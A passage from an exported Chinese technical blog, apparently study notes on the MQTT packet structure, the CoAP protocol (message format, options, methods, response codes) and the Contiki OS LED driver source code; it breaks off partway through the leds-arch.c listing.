<h5 id="固定头部"><a href="#固定头部" class="headerlink" title="固定头部"></a>固定头部</h5><p>　　每个 MQTT 命令消息的消息头部都包含一个固定头部。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-2.png" alt="7-2"></p>
<ul>
<li><p>MQTT 控制报文的类型 </p>
<p>  MQTT 包含的控制包类型一共有14种，如下图：</p>
<p>  <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-3.png" alt="7-3"></p>
</li>
<li><p>用于指定控制报文类型的标志位</p>
<p>  固定报头第 1 个字节的剩余的 4 位 [3-0]包含每个 MQTT 控制报文类型特定的标志</p>
<p>  <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-4.png" alt="7-4"></p>
<ul>
<li>DUP = 控制报文的重复分发标志</li>
<li>QoS = PUBLISH 报文的服务质量等级</li>
<li>RETAIN = PUBLISH 报文的保留标志</li>
</ul>
</li>
<li><p>剩余长度</p>
<p>  　　剩余长度（Remaining Length）表示当前报文剩余部分的字节数，包括可变报头和负载的数据。剩余长度不包括用于编码剩余长度字段本身的字节数。</p>
</li>
</ul>
<h5 id="可变报头"><a href="#可变报头" class="headerlink" title="可变报头"></a>可变报头</h5><p>　　某些 MQTT 控制报文包含一个可变报头部分。它在固定报头和负载之间。可变报头的内容根据报文类型的不同而不同。可变报头的报文标识符（Packet Identifier）字段存在于在多个类型的报文里。</p>
<ul>
<li><p>报文标识符</p>
<p>  <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-5.png" alt="7-5"></p>
<p>  　　很多控制报文的可变报头部分包含一个两字节的报文标识符字段。这些报文是 PUBLISH（QoS&gt;0 时），PUBACK，PUBREC，PUBREL，PUBCOMP，SUBSCRIBE, SUBACK，UNSUBSCIBE，UNSUBACK。</p>
<p>  　　包含报文标识符的控制报文：</p>
<p>  <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-6.png" alt="7-6"></p>
</li>
</ul>
<h5 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h5><p>　　某些 MQTT 控制报文在报文的最后部分包含一个有效载荷。例如，对于 PUBLISH 包而言，其有效载荷为应用层消息，对于 SUBSCRIBE 包而言，其有效载荷内容为主题过滤器列表，SUBACK 包的有效载荷包含一个返回码列表。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/7-7.png" alt="7-7"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Protocol</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
      </tags>
  </entry>
  <entry>
    <title>CoAP 协议学习笔记</title>
    <url>/2017/03/01/CoAP%20%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>　　CoAP（Constrained Application Protocol）议是为物联网中资源受限设备制定的应用层协议。由于物联网中的很多设备都是资源受限型的，即只有少量的内存空间和有限的计算能力，所以传统的 HTTP 协议应用在物联网上就显得过于庞大而不适用。IETF 的 CoRE 工作组提出了一种基于 REST 架构的 CoAP 协议。</p>
<a id="more"></a>
<h4 id="CoAP-简介"><a href="#CoAP-简介" class="headerlink" title="CoAP 简介"></a>CoAP 简介</h4><p>　　CoAP 是一种应用层协议，它运行于 UDP 协议之上而不是像 HTTP 那样运行于 TCP 之上。</p>
<p>　　CoAP 协议基于 REST 构架，REST 是指表述性状态转换架构，是互联网资源访问协议的一般性设计风格。为了克服HTTP对于受限环境的劣势，CoAP 既考虑到数据报长度的最优化，又考虑到提供可靠通信。一方面，CoAP提供 URI，REST 式的方法如 GET，POST，PUT 和 DELETE，以及可以独立定义的头选项提供的可扩展性。另一方面，CoAP 基于轻量级的 UDP 协议，并且允许 IP 多播。而组通信是物联网最重要的需求之一，比如说用于自动化应用中。为了弥补 UDP 传输的不可靠性，CoAP 定义了带有重传机制的事务处理机制。并且提供资源发现机制，并带有资源描述。</p>
<h5 id="CoAP-的特点"><a href="#CoAP-的特点" class="headerlink" title="CoAP 的特点"></a>CoAP 的特点</h5><ul>
<li><p>CoAP 采用了二进制报头，而不是文本报头（text header）。</p>
</li>
<li><p>CoAP 降低了头的可用选项的数量。</p>
</li>
<li><p>CoAP 减少了一些 HTTP 的方法。</p>
</li>
<li><p>CoAP 可以支持检测装置。</p>
</li>
</ul>
<h5 id="CoAP-与-Http协议"><a href="#CoAP-与-Http协议" class="headerlink" title="CoAP 与 Http协议"></a>CoAP 与 Http协议</h5><p>　　CoAP 协议不是盲目的压缩了HTTP协议，考虑到资源受限设备的低处理能力和低功耗限制，CoAP 重新设计了HTTP的部分功能以适应设备的约束条件。另外，为了使协议适应物联网和 M2M 应用，CoAP 协议改进了一些机制，同时增加了一些功能。图1 显示了 HTTP 和 CoAP 的协议栈。CoAP 和 HTTP 在传输层有明显的区别。HTTP 协议的传输层采用了 TCP 协议，而 CoAP 协议的传输层使用 UDP 协议，开销明显降低，并支持多播。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-1.jpg" alt="2-1"></p>
<p>　　CoAP 协议采用了双层的结构。事务层（Transaction layer）处理节点间的信息交换，同时，也提供对多播和拥塞控制的支持。请求/响应层（Request/Response layer）以传输对资源进行操作的请求和相应信息。CoAP 协议的REST 构架基于该层的通信，REST 请求附在一个 CON 或者 NON 消息上，而 REST 响应附在匹配的 ACK 消息上。 CoAP 的双层处理方式，使得 CoAP 没有采用 TCP 协议，也可以提供可靠的传输机制。利用默认的定时器和指数增长的重传间隔时间实现 CON 消息的重传，直到接收方发出确认消息。另外，CoAP 的双层处理方式支持异步通信，这是物联网和 M2M 应用的关键需求之一。</p>
<h4 id="CoAP-报文"><a href="#CoAP-报文" class="headerlink" title="CoAP 报文"></a>CoAP 报文</h4><h5 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h5><p>　　CoAP 协议非常小巧，一个 CoAP 消息最小为 4 个字节，以下是 CoAP 协议不同部分的描述：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-2.png" alt="2-2"></p>
<ul>
<li><p>【Ver】版本编号，指示CoAP协议的版本号。类似于HTTP 1.0 HTTP 1.1。版本编号占2位，取值为01B。</p>
</li>
<li><p>【T】报文类型，CoAP协议定了4种不同形式的报文，CON报文，NON报文，ACK报文和RST报文。</p>
</li>
<li><p>【TKL】CoAP 标识符长度。CoAP 协议中具有两种功能相似的标识符，一种为 Message ID（报文编号），一种为 Token （标识符）。其中每个报文均包含消息编号，但是标识符对于报文来说是非必须的。</p>
</li>
<li><p>【Code】功能码/响应码。Code 在 CoAP 请求报文和响应报文中具有不同的表现形式，Code 占一个字节，它被分成了两部分，前 3 位一部分，后 5 位一部分，为了方便描述它被写成了 c.dd 结构。其中 0.XX 表示 CoAP请求的某种方法，而 2.XX、4.XX 或 5.XX 则表示 CoAP 响应的某种具体表现。</p>
</li>
<li><p>【消息ID Message ID】每个 CoAP 消息都有一个 ID，在一次会话中 ID 总是保持不变。但在这个会话之后该ID 会被回收利用。</p>
</li>
<li><p>【标记 Token】标识符具体内容，通过 TKL 指定 Token 长度。</p>
</li>
<li><p>【选项 Options】：CoAP 报文选项类似于 HTTP 请求头，它包括 CoAP 消息本身，例如 CoAP 端口号，CoAP主机和 CoAP 查询字符串等。</p>
</li>
<li><p>【1111 1111】CoAP 报文和具体负载之间的分隔符。</p>
</li>
<li><p>【负载Payload】：真正有用的被交互的数据。</p>
</li>
</ul>
<h5 id="Option-格式"><a href="#Option-格式" class="headerlink" title="Option 格式"></a>Option 格式</h5><ol>
<li><p>组成部分</p>
<p>　　一般情况下 Option 部分包含 Option Delta、Option Length 和 Option Value 三部分。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-3.png" alt="2-3"></p>
</li>
</ol>
<ul>
<li><p>【Option Delta】表示Option的增量，当前的Option的具体编号等于之前所有Option Delta的总和。</p>
</li>
<li><p>【Option Length】表示Option Value的具体长度。</p>
</li>
<li><p>【Option Value】表示Option具体内容。</p>
</li>
</ul>
<ol>
<li>Option 类型及编号</li>
</ol>
<p>　　CoAP 中所有的 Option 都采用编号的方式，这些 Option 及编号的定义如下图所示。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-4.png" alt="2-4"></p>
<p>　　在这些 option 中，Uri-Host、Uri-Port、Uri-Path 和 Uri-Query 等和资源“位置”和参数有关。</p>
<ul>
<li><p>【3】Uri-Host：CoAP 主机名称，例如 iot.eclipse.org</p>
</li>
<li><p>【7】Uri-Port：CoAP 端口号，默认为 5683</p>
</li>
<li><p>【11】Uri-Path： 资源路由或路径，例如 \temperature。资源路径采用 UTF8 字符串形式，长度不计第一个”\”。</p>
</li>
<li><p>【15】Uri-Query：访问资源参数，例如 ?value1=1&amp;value2=2，参数与参数之间使用 “&amp;” 分隔，Uri-Query 和 Uri-Path 之间采用 “?” 分隔。</p>
</li>
</ul>
<p>　　在这些 option 中，Content-Format 和 Accept 用于表示 CoAP 负载的媒体格式</p>
<ul>
<li><p>【12】Content-Format：指定 CoAP 复杂媒体类型，媒体类型采用整数描述，例如 application/json 对应整数 50，application/octet-stream 对应整数 40。</p>
</li>
<li><p>【17】Accept：指定 CoAP 响应复杂中的媒体类型，媒体类型的定义和 Content-Format 相同。</p>
</li>
</ul>
<ol>
<li>Content-Format</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-5.png" alt="2-5"></p>
<ul>
<li><p>【text/plain】 编号为 0，表示负载为字符串形式，默认为 UTF8 编码。</p>
</li>
<li><p>【application/link-format】编号为 40，CoAP 资源发现协议中追加定义，该媒体类型为 CoAP 协议特有。</p>
</li>
<li><p>【application/xml】编号为 41，表示负载类型为 XML 格式。</p>
</li>
<li><p>【application/octet-stream】编号为 42，表示负载类型为二进制格式。</p>
</li>
<li><p>【application/exi】编号为 47，表示负载类型为 “精简 XML” 格式。</p>
</li>
</ul>
<p>　　另外，还有一种格式也被 IANA 认定，也会在 CoAP 协议中广泛使用那便是 CBOR 格式，该格式可理解为二进制 JSON 格式。</p>
<ul>
<li>【applicaiton/cbor】编号为 60。</li>
</ul>
<h5 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h5><p>　　CoAP 采用与 HTTP 协议相同的请求响应工作模式，CoAP 协议共有 4 中不同的消息类型：</p>
<ul>
<li><p>CON：需要被确认的请求，如果 CON 请求被发送，那么对方必须做出响应。</p>
</li>
<li><p>NON：不需要被确认的请求，如果 NON 请求被发送，那么对方不必做出回应。</p>
</li>
<li><p>ACK：应答消息，接受到 CON 消息的响应。</p>
</li>
<li><p>RST：复位消息，当接收者接收到的消息包含一个错误，接收者解析消息或者不再关心发送者发送的内容，那么复位消息将会被发送。</p>
</li>
</ul>
<h4 id="CoAP请求"><a href="#CoAP请求" class="headerlink" title="CoAP请求"></a>CoAP请求</h4><h5 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h5><p>　　在 CoAP 请求中，Code 被定义为 CoAP 请求方法，这些方法有 GET、POST、PUT 和 DELETE，这些方法和 HTTP 协议非常相似。</p>
<ul>
<li><p>GET 方法：用于获得请求URI标识的资源。</p>
<p>  The GET method is safe and idempotent. </p>
</li>
<li><p>POST 方法：用于创建新资源或更新目标资源。</p>
<p>  POST is neither safe nor idempotent.</p>
</li>
<li><p>PUT 方法：用于更新某资源。</p>
<p>  PUT is not safe but is idempotent.</p>
</li>
<li><p>DELETE 方法：用于删除某资源。</p>
<p>  DELETE is not safe but is idempotent.</p>
</li>
</ul>
<h5 id="需要说明的问题"><a href="#需要说明的问题" class="headerlink" title="需要说明的问题"></a>需要说明的问题</h5><ol>
<li>Safe</li>
</ol>
<p>　　上面的英文是 RFC 7252 文档的内容，其中的安全是指是否会改变服务器端的数据，而不是我们通常所说的数据的保密性。因为如果考虑到某些服务端和客户端的默认配置和默认使用方式，那么 POST 在很多时候比 GET 安全，因为 GET 的 URL 会被放在浏览器历史和WEB服务器日志里面。</p>
<ol>
<li>Idempotent</li>
</ol>
<p>　　idempotent 的意思就是指 CoAP 方法重复执行多次，产生的效果是一样的。往一个 URI 发送一个 CoAP 的 PUT 或者 POST 请求，CoAP 的 body 部分就是一个文档，我们应该用 PUT 方法还是 POST 方法？取决于这个REST 服务的行为是否是 Idempotent的。也就是我们采用 PUT 或者 POST 方法之后，服务器端是什么样的行为？如果产生了两个文档，那就说明这个服务不是 Idempotent 的，因为多次使用产生了副作用了嘛；如果后一个请求把第一个请求覆盖掉了，那这个服务就是 Idempotent 的。前一种情况，应该使用 POST 方法，后一种情况，应该使用 PUT 方法。</p>
<h4 id="CoAP-响应"><a href="#CoAP-响应" class="headerlink" title="CoAP 响应"></a>CoAP 响应</h4><h5 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h5><ul>
<li><p>Success：2.xx</p>
<p>  2.01 Created. 回复POST或者PUT。</p>
<p>  2.02 Deleted. 回复DELETE，有些情况下的POST。</p>
<p>  2.03 Valid. Indicate that the response identified by the entity-tag identified by the included ETag Option is valid. 所以，Response必须带ETag Option。　</p>
<p>  2.04 Changed. 回复POST和PUT。</p>
<p>  2.05 Content. 回复GET。</p>
</li>
<li><p>Client Error：4.xx</p>
<p>  4.00 Bad Request. 错误的请求。</p>
<p>  4.01 Unauthorized 未经许可的。</p>
<p>  4.02 Bad Option 错误的选项</p>
<p>  4.03 Forbidden 访问被拒绝。</p>
<p>  4.04 Not Found 未找到。</p>
<p>  4.05 Method Not Allowed 方法不被允许。</p>
<p>  4.06 Not Acceptable 不可接受的。</p>
<p>  4.12 Precondition Failed 前提条件失败。</p>
<p>  4.13 Request Entity Too Large 请求实体太大。</p>
<p>  4.15 Unsupported Content-Format 不支持的内容格式。</p>
</li>
<li><p>Server Error：5.xx</p>
<p>  5.00 Internal Server Error 内部服务器错误。</p>
<p>  5.01 Not Implemented 没有实现。</p>
<p>  5.02 Bad Gateway 错误的网关。</p>
<p>  5.03 Service Unavailable 服务不可用。</p>
<p>  5.04 Gateway Timeout 网关超时。</p>
<p>  5.05 Proxying Not Supported 代理不支持。</p>
</li>
<li><p>Future Use：3.00-3.31</p>
</li>
</ul>
<h4 id="请求-响应模型"><a href="#请求-响应模型" class="headerlink" title="请求/响应模型"></a>请求/响应模型</h4><p>　　Piggybacked Response, Separate Response, Non-confirmable Response 三种类型</p>
<ul>
<li><p>Piggybacked Response. </p>
<p>  <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-6.png" alt="2-6"></p>
<p>  　　最常用的类型，Reponse 内容直接放在 ACK 中。一个请求中携带的确认消息中携带的确认（ACK）消息的响应。</p>
</li>
<li><p>Separate Response. </p>
<p>  <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-7.png" alt="2-7"></p>
<p>  　　Server 暂时没办法直接回数据(可能需要更多的时间准备)，所以先直接回 Empty ACK 告诉 Client 请求我已经收到，数据准备好再给你发送数据，避免重复请求。当Server准备好了，给 Client 发 CON (也可以是NON)，最后 Client 回 ACK 告诉 Server 数据我已经收到了。如果 Server 在回复 Clinet 之前又收到 Client 的重传，那么也回 Empty ACK。</p>
</li>
<li><p>Non-confirmable Response. </p>
<p>  <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/3/2-8.png" alt="2-8"></p>
<p>  　　Client 发出 NON，Server 一般也回 NON，但是，双方发出的消息都不要求是可靠的，即使有一方发送的数据另一方没接收到也没问题，因为不要求可靠也就是 Client 和 Server 都可以不得到数据。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Protocol</category>
      </categories>
      <tags>
        <tag>CoAP</tag>
      </tags>
  </entry>
  <entry>
    <title>Contiki LED 驱动部分应用</title>
    <url>/2017/02/23/Contiki%20LED%20%E9%A9%B1%E5%8A%A8%E9%83%A8%E5%88%86%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>　　Contiki 为用户提供了控制 LED 的接口，在各个平台下也给出了对应的函数，但是由于牵扯到多个文件，这对于初学者来说也是很麻烦的事情，这篇博客将一步步解析 Contiki LED 控制的实现机制。</p>
<a id="more"></a>
<h4 id="LED-API-函数"><a href="#LED-API-函数" class="headerlink" title="LED API 函数"></a>LED API 函数</h4><p>　　由于 Contiki 需要适应多种平台，所以 Contiki 提供了底层控制LED的三大接口，分别是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_arch_init</span><span class="params">(<span class="keyword">void</span>)</span>  <span class="comment">//LED初始化函数</span></span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">leds_arch_get</span><span class="params">(<span class="keyword">void</span>)</span>  <span class="comment">//LED状态获取函数</span></div><div class="line"><span class="keyword">void</span> <span class="title">leds_arch_set</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span>  <span class="comment">//LED状态设置函数</span></div></pre></td></tr></table></figure>
<p>　　为方便各个平台对于 LED 的控制，在各个平台下又提供了详细的控制 API 接口，分别是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">//LED初始化</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_blink</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">//所有LED闪烁</span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">leds_get</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">//获取LED的状态</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_set</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;  <span class="comment">//设置LED的状态</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_on</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;  <span class="comment">//LED打开</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_off</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;  <span class="comment">//LED关闭</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_toggle</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;  <span class="comment">//LED状态切换，反转</span></div></pre></td></tr></table></figure>
<h4 id="LED-驱动文件"><a href="#LED-驱动文件" class="headerlink" title="LED 驱动文件"></a>LED 驱动文件</h4><h5 id="leds-c-文件"><a href="#leds-c-文件" class="headerlink" title="leds.c 文件"></a>leds.c 文件</h5><p>　　打开位于 /home/user/contiki/core 目录的 leds.c 文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dev/leds.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sys/clock.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sys/energest.h"</span></span></div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> leds;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">show_leds</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> new_leds)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> changed;</div><div class="line">  changed = leds ^ new_leds;</div><div class="line">  leds = new_leds;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(changed &amp; LEDS_GREEN) &#123;</div><div class="line">    <span class="comment">/* Green did change */</span></div><div class="line">    <span class="keyword">if</span>(leds &amp; LEDS_GREEN) &#123;</div><div class="line">      ENERGEST_ON(ENERGEST_TYPE_LED_GREEN);  <span class="comment">//方便跟踪节能设计了energest模块</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      ENERGEST_OFF(ENERGEST_TYPE_LED_GREEN);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>(changed &amp; LEDS_YELLOW) &#123;</div><div class="line">    <span class="keyword">if</span>(leds &amp; LEDS_YELLOW) &#123;</div><div class="line">      ENERGEST_ON(ENERGEST_TYPE_LED_YELLOW);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      ENERGEST_OFF(ENERGEST_TYPE_LED_YELLOW);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>(changed &amp; LEDS_RED) &#123;</div><div class="line">    <span class="keyword">if</span>(leds &amp; LEDS_RED) &#123;</div><div class="line">      ENERGEST_ON(ENERGEST_TYPE_LED_RED);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      ENERGEST_OFF(ENERGEST_TYPE_LED_RED);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  leds_arch_set(leds);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_init</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  leds_arch_init();</div><div class="line">  leds = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_blink</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  <span class="comment">/* Blink all leds that were initially off. */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> blink;</div><div class="line">  blink = ~leds;</div><div class="line">  leds_toggle(blink);</div><div class="line"></div><div class="line">  clock_delay(<span class="number">400</span>);</div><div class="line"></div><div class="line">  leds_toggle(blink);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span></span></div><div class="line"><span class="title">leds_get</span><span class="params">(<span class="keyword">void</span>)</span> &#123;</div><div class="line">  <span class="keyword">return</span> leds_arch_get();</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_set</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> ledv)</span></div><div class="line">&#123;</div><div class="line">  show_leds(ledv);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_on</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> ledv)</span></div><div class="line">&#123;</div><div class="line">  show_leds(leds | ledv);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_off</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> ledv)</span></div><div class="line">&#123;</div><div class="line">  show_leds(leds &amp; ~ledv);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_toggle</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> ledv)</span></div><div class="line">&#123;</div><div class="line">  show_leds(leds ^ ledv);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div></pre></td></tr></table></figure>
<h5 id="leds-h-文件"><a href="#leds-h-文件" class="headerlink" title="leds.h 文件"></a>leds.h 文件</h5><p>　　打开位于 /home/user/contiki/core 目录的 leds.h 文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEDS_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_H_</span></div><div class="line"></div><div class="line"><span class="comment">/* Allow platform to override LED numbering */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"contiki-conf.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Blink all LEDs.</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_blink</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEDS_GREEN</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_GREEN  1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEDS_GREEN */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEDS_YELLOW</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_YELLOW  2</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEDS_YELLOW */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEDS_RED</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_RED  4</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEDS_RED */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEDS_BLUE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_BLUE  LEDS_YELLOW</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEDS_BLUE */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LEDS_CONF_ALL</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_ALL    LEDS_CONF_ALL</span></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* LEDS_CONF_ALL */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_ALL    7</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEDS_CONF_ALL */</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Returns the current status of all leds</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">leds_get</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_set</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_on</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_off</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_toggle</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Leds implementation</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_arch_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">leds_arch_get</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">leds_arch_set</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> leds)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* LEDS_H_ */</span></span></div></pre></td></tr></table></figure>
<h5 id="leds-arch-c-文件"><a href="#leds-arch-c-文件" class="headerlink" title="leds-arch.c 文件"></a>leds-arch.c 文件</h5><p>　　打开 /home/contiki/platform/cc2538dk/dev 目录下的 leds-arch.c 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"contiki.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"reg.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dev/leds.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dev/gpio.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEDS_GPIO_PIN_MASK LEDS_ALL</span></div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">leds_arch_init</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  <span class="comment">/* 这里解释下：LED控制使用的是PC0~PC7端口，一共有7个引脚，LEDS_GPIO_PIN_MASK被定义为LEDS_ALL，</span></div><div class="line">   * 而在leds.h里面LEDS_ALL被定义为7，二进制展开即为111，低三位赋值为1，即这三个引脚被配置为输出通道。</div><div class="line">   